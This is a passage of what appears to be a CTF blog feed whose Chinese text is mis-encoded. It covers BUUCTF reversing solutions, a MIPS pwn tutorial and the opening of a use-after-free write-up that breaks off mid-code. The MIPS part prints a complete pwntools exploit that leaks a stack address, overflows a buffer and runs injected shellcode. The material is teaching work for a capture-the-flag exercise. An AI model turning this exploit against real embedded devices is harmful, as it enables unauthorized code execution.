        <content type="html"><![CDATA[    <div id="aplayer-zPjkaMln" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="511975454" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div><h1 id="0x07-reverse3"><a href="#0x07-reverse3" class="headerlink" title="0x07 reverse3"></a>0x07 reverse3</h1><p>é€šè¿‡<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=</code>å’ŒåŠ¨æ€è°ƒè¯•åˆ¤æ–­å‡ºbase64</p><p><code>shift+f12</code> æŸ¥æ‰¾å­—ç¬¦ä¸²</p><p><code>ctrl+x</code>äº¤å‰å¼•ç”¨</p><p><code>shift+e</code>è½¬æ¢å­—ç¬¦æ•°ç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = [ <span class="number">101</span>, <span class="number">51</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">102</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">57</span>, <span class="number">98</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">64</span>, <span class="number">110</span>, <span class="number">64</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">0</span>]</span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>):</span><br><span class="line">  s += <span class="built_in">chr</span>(data[i]-i)</span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h1 id="0x08-helloworld"><a href="#0x08-helloworld" class="headerlink" title="0x08 helloworld"></a>0x08 helloworld</h1><p>å®‰å“é€†å‘ï¼Œç”¨jadxæ‰“å¼€apkï¼Œåœ¨MainActivityä¸‹æ‰¾åˆ°flag</p><h1 id="0x09-ä¸ä¸€æ ·çš„flag"><a href="#0x09-ä¸ä¸€æ ·çš„flag" class="headerlink" title="0x09 ä¸ä¸€æ ·çš„flag"></a>0x09 ä¸ä¸€æ ·çš„flag</h1><p>è¿·å®«é¢˜ï¼Œåªèƒ½èµ°0ï¼ŒåŠ¨æ€è°ƒè¯•å¾—å‡ºè¡Œèµ°è·¯çº¿å³ä¸ºflag</p><p>å¿«æ·é”®ï¼šf9è¿è¡Œåˆ°æ–­ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*1111</span><br><span class="line">01000</span><br><span class="line">01010</span><br><span class="line">00010</span><br><span class="line">1111#</span><br></pre></td></tr></table></figure><p>flag{222441144222}</p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mips pwnå…¥é—¨æŒ‡åŒ—</title>
      <link href="/posts/7b49d65d/"/>
      <url>/posts/7b49d65d/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-lwRROoRz" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1969538016" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div><h1 id="å‰æ"><a href="#å‰æ" class="headerlink" title="å‰æ"></a>å‰æ</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>å¦‚æœè¿˜æ²¡æœ‰å®‰è£…qemuçš„å°ä¼™ä¼´å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install --install-suggests qemu</span><br></pre></td></tr></table></figure><h3 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><h3 id="mipsè½¯ä»¶åŒ…"><a href="#mipsè½¯ä»¶åŒ…" class="headerlink" title="mipsè½¯ä»¶åŒ…"></a>mipsè½¯ä»¶åŒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…·å¤‡MIPSäº¤å‰ç¼–è¯‘gccä¸MIPSç¨‹åºåŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">sudo apt-get install gcc-mips-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install gcc-mips64-linux-gnuabi64</span><br><span class="line">sudo apt-get install gcc-mips64el-linux-gnuabi64</span><br></pre></td></tr></table></figure><h2 id="mipsæ±‡ç¼–"><a href="#mipsæ±‡ç¼–" class="headerlink" title="mipsæ±‡ç¼–"></a>mipsæ±‡ç¼–</h2><p><strong>mipsæ¶æ„ç”±äºæœ¬èº«ç‰¹æ€§ä¸æ”¯æŒnxï¼Œæ‰€ä»¥æ ˆæ®µå…·æœ‰æ‰§è¡Œæƒé™</strong></p><table><thead><tr><th align="left">å¯„å­˜å™¨</th><th align="left">åˆ«å</th><th align="left">ä½¿ç”¨</th></tr></thead><tbody><tr><td align="left">$0</td><td align="left">$zero</td><td align="left">å¸¸é‡0</td></tr><tr><td align="left">$1</td><td align="left">$at</td><td align="left">ä¿ç•™ç»™æ±‡ç¼–å™¨</td></tr><tr><td align="left">$2-$3</td><td align="left">$v0-$v1</td><td align="left">å‡½æ•°è¿”å›å€¼</td></tr><tr><td align="left">$4-$7</td><td align="left">$a0-$a3</td><td align="left">å‡½æ•°è°ƒç”¨å‚æ•°</td></tr><tr><td align="left">$8-$15</td><td align="left">$t0-$t7</td><td align="left">ä¸´æ—¶å¯„å­˜å™¨</td></tr><tr><td align="left">$16-$23</td><td align="left">$s0-$s7</td><td align="left">ä¿å­˜å¯„å­˜å™¨</td></tr><tr><td align="left">$24-$25</td><td align="left">$t8-$t9</td><td align="left">ä¸´æ—¶å¯„å­˜å™¨</td></tr><tr><td align="left">$26-$27</td><td align="left">$k0-$k1</td><td align="left">ä¿ç•™ç»™ç³»ç»Ÿ</td></tr><tr><td align="left">$28</td><td align="left">$gp</td><td align="left">å…¨å±€æŒ‡é’ˆ</td></tr><tr><td align="left">$29</td><td align="left">$sp</td><td align="left">å †æ ˆæŒ‡é’ˆ</td></tr><tr><td align="left">$30</td><td align="left">$fp</td><td align="left">å¸§æŒ‡é’ˆ</td></tr><tr><td align="left">$31</td><td align="left">$ra</td><td align="left">è¿”å›åœ°å€</td></tr></tbody></table><table><thead><tr><th>Instruction</th><th>Example</th><th align="left">Meaning</th></tr></thead><tbody><tr><td>jump</td><td>j 10000</td><td align="left">go to 10000<br/><em>Jump to target address</em></td></tr><tr><td>jump register</td><td>jr $31</td><td align="left">go to $31<br/><em>For switch, procedure return</em></td></tr><tr><td>jump and link</td><td>jal 10000</td><td align="left">$31 &#x3D; PC + 4; go to 10000<br/><em>For procedure call</em></td></tr></tbody></table><h1 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h1><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>mips pwnæˆ‘ä»¬å°±ç”¨hwså…¥è¥èµ›çš„ä¸€é“é¢˜æ¥å…¥é—¨</p><p>strncmpå‡½æ•°å°†è¾“å…¥çš„å‰5ä¸ªå­—èŠ‚ä¸adminæ¯”è¾ƒ,ç›¸åŒè¿”å›0,ç¨‹åºç»§ç»­è¿è¡Œã€‚ç¨‹åºæ²¡æœ‰å¯¹è¾“å…¥çš„æœ€åä¸€å­—èŠ‚ç½®ç©ºï¼Œè¾“å…¥24ä¸ªå­—èŠ‚åå¯ä»¥é€šè¿‡printfå¸¦å‡ºæ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">username</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">24</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[34m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">24</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v1, <span class="string">&quot;admin&quot;</span>, <span class="number">5</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Correct name : %s&quot;</span>, v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strlen</span>(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å˜é‡v2å’Œv3å†…å­˜ç©ºé—´æ˜¯è¿ç»­çš„ï¼Œæˆ‘ä»¬readè¿›20ä¸ªå­—èŠ‚åï¼Œå¯ä»¥å°†v3ä¿®æ”¹ä¸ºä»»æ„å€¼ï¼Œç„¶åå°±å¯ä»¥å‘v4è¶…é‡å†™å…¥æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_400978</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">20</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">36</span>]; <span class="comment">// [sp+3Ch] [+3Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a1 + <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\x1B[31m&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pre_Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">36</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v4, v3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(v2, <span class="string">&quot;access&quot;</span>, <span class="number">6</span>) || <span class="built_in">strncmp</span>(v4, <span class="string">&quot;0123456789&quot;</span>, <span class="number">10</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Correct password : **********&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>åˆ†æå®Œå‡½æ•°ï¼Œå¼€å§‹è°ƒè¯•éªŒè¯ï¼Œé¦–å…ˆä»‹ç»ä¸‹å¦‚ä½•è°ƒè¯•mipsæ¶æ„ä¸‹çš„ç¨‹åº</p><p>qemu -g å¼€å¯9000ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 9000 -L ./ Mplogin  | hexdump -C</span><br></pre></td></tr></table></figure><p>å¼€å¯å¦ä¸€ä¸ªterminalå¯åŠ¨gdbå¤šæ¶æ„è°ƒè¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q ./Mplogin</span><br></pre></td></tr></table></figure><p>è®¾ç½®mipsæ¶æ„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> architecture mips</span><br></pre></td></tr></table></figure><p>é€‰æ‹©å°ç«¯åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> endian little</span><br></pre></td></tr></table></figure><p>è¿æ¥ç›®æ ‡ç«¯å£</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote :9000</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112155432.png" alt="debug"></p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è¾“å…¥admin + xxxæ³„éœ²å‡ºæ ˆåœ°å€ï¼Œæ‹¿ä¸ªå°æœ¬æœ¬è®°ä¸‹æ¥ï¼Œå¾…ä¼šæœ‰å¤§ç”¨</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112156336.png" alt="use"></p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦ç¯¡æ”¹v3çš„å€¼ï¼Œå¦‚æœè¦å°†v3çš„å€¼è¦†ç›–æˆä¸å¯è§å­—ç¬¦ï¼Œæ¯”å¦‚0x120ï¼Œä¸Šé¢çš„è°ƒè¯•æ–¹æ³•å°±æ— èƒ½ä¸ºåŠ›äº†ï¼Œæ‰€ä»¥ä¸‹é¢å°†ä»‹ç»å¦ä¸€ç§è°ƒè¯•æ–¹æ³•</p><p>å†™å¥½ä¸€æ®µè„šæœ¬ï¼Œè¿è¡Œ</p><p>ç„¶åæŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤æ‰§è¡Œå³å¯ï¼Œè¿™ç§è°ƒè¯•æ–¹æ³•å®é™…ä¸Šæ˜¯é€šè¿‡è„šæœ¬å‘é€ä¸å¯è§æ•°æ®ï¼Œå…¶ä½™ä¸ä¸Šé¢æ‰€è¿°å¹¶æ— äºŒå¼‚</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112157307.png" alt="script"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;mips&#x27;</span>,endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-g&quot;</span>,<span class="string">&quot;9000&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>]) <span class="comment">#å¼€å¯9000ç«¯å£</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Username : &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">19</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Pre_Password : &#x27;</span>,<span class="string">b&#x27;access&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>) + p32(<span class="number">0x120</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°v3å˜é‡(sp+2Ch)å·²ç»è¢«è¦†ç›–æˆ0x120</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112158315.png" alt="overflow"></p><p>è¿™æ ·å°±å¯ä»¥é€šè¿‡ç¬¬äºŒä¸ªreadæº¢å‡ºè‡³è¿”å›åœ°å€ï¼Œä¿®æ”¹ä¸ºæ ˆåœ°å€åï¼Œå³å¯ret2shellcode</p><p><em>ç¬”è€…çš„qemuæ²¡æœ‰å¼€å¯aslrï¼Œé€šè¿‡è°ƒè¯•å¾—åˆ°æ ˆåœ°å€å†™å…¥ä¹Ÿå¯ä»¥ï¼Œç”±äºæ²¡æœ‰è¿œç¨‹ç¯å¢ƒï¼Œæ— æ³•ç¡®å®šè¿œç¨‹æ˜¯å¦å¼€å¯aslr</em></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/img/202403112158327.png" alt="shell"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;mips&#x27;</span>,endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">p = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line"><span class="comment">#p = process([&quot;qemu-mipsel&quot;,&quot;-g&quot;,&quot;9000&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./Mplogin&quot;])</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Username : &#x27;</span>,<span class="string">b&#x27;admin&#x27;</span>.ljust(<span class="number">24</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span> * <span class="number">19</span>)</span><br><span class="line">stack = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;stack =&gt; &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;Pre_Password : &#x27;</span>,<span class="string">b&#x27;access&#x27;</span>.ljust(<span class="number">20</span>,<span class="string">b&#x27;b&#x27;</span>) + p32(<span class="number">0x120</span>))</span><br><span class="line">sa(<span class="string">b&#x27;Password : &#x27;</span>,<span class="string">b&#x27;0123456789&#x27;</span>.ljust(<span class="number">40</span>,<span class="string">b&#x27;w&#x27;</span>) + p32(stack) + asm(shellcraft.sh())) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWSèµ›é¢˜ å…¥é—¨ MIPS Pwn</a></p><p><a href="https://zyen12138.github.io/2021/10/05/MIPS-PWN%E5%85%A5%E9%97%A8/">MIPS PWNå…¥é—¨</a></p><p><a href="https://qingmu-z.github.io/2021/11/09/pwn/mipspwn/#more">mips-pwn</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> mips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>time_formatteré¢˜è§£</title>
      <link href="/posts/520eb600/"/>
      <url>/posts/520eb600/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><p>ç®€å•çš„è¯´ï¼ŒUse After Free å°±æ˜¯å…¶å­—é¢æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨ã€‚ä½†æ˜¯å…¶å®è¿™é‡Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µ</p><ul><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li><li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong>ã€‚</li></ul><p>è€Œæˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„ <strong>Use After Free</strong> æ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œ<strong>æˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointerã€‚</strong></p><h1 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h1><p>è¿è¡Œç¨‹åºæ˜¯ä¸€ä¸ªèœå•,åæœ‰å…«ä¹æ˜¯å †é¢˜</p><p>idaåæ±‡ç¼–,å¼€å§‹é™æ€åˆ†æ,ä¸ºæ–¹ä¾¿åˆ†æ,å°†éƒ¨åˆ†å‡½æ•°,å˜é‡é‡å‘½å</p><p>ret_ptr()å‡½æ•°ä¸­<code>fgets(str, 1024, stdin);</code>ä»æ ‡å‡†è¾“å…¥è¯»å–å­—èŠ‚</p><p><code>str[strcspn(str, &quot;\n&quot;)] = 0;</code>è¿”å›ç¬¬ä¸€ä¸ªâ€\nâ€çš„ä¸‹æ ‡å¹¶å°†å…¶ç½®null</p><p><strong>size_t strcspn(const char *str1, const char *str2)</strong> æ£€ç´¢å­—ç¬¦ä¸² <strong>str1</strong> å¼€å¤´è¿ç»­æœ‰å‡ ä¸ªå­—ç¬¦éƒ½ä¸å«å­—ç¬¦ä¸² <strong>str2</strong> ä¸­çš„å­—ç¬¦ã€‚è¯¥å‡½æ•°è¿”å› str1 å¼€å¤´è¿ç»­éƒ½ä¸å«å­—ç¬¦ä¸² str2 ä¸­å­—ç¬¦çš„å­—ç¬¦æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">ret_ptr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> str[<span class="number">1024</span>]; <span class="comment">// [rsp+8h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+408h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;%s&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">1024</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  str[<span class="built_in">strcspn</span>(str, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> malloc_heap(str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>malloc_heap()å‡½æ•°ä¸­<code>v1 = strdup(str);</code>strdupå‡½æ•°ç±»ä¼¼malloc,å¯ä»¥ä»å †ä¸Šåˆ†é…å‚æ•°strå­—ç¬¦ä¸²å¤§å°ç›¸åŒçš„ç©ºé—´</p><p>**char *strdup(const char *str)**å°†å­—ç¬¦ä¸²å¤åˆ¶åˆ°æ–°å»ºç«‹çš„ç©ºé—´,è¯¥å‡½æ•°ä¼šå…ˆç”¨malloc()é…ç½®ä¸å‚æ•°strå­—ç¬¦ä¸²ç›¸åŒçš„ç©ºé—´å¤§å°ï¼Œç„¶åå°†å‚æ•°strå­—ç¬¦ä¸²çš„å†…å®¹å¤åˆ¶åˆ°è¯¥å†…å­˜åœ°å€ï¼Œç„¶åæŠŠè¯¥åœ°å€è¿”å›ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">malloc_heap</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v1 = strdup(str);                       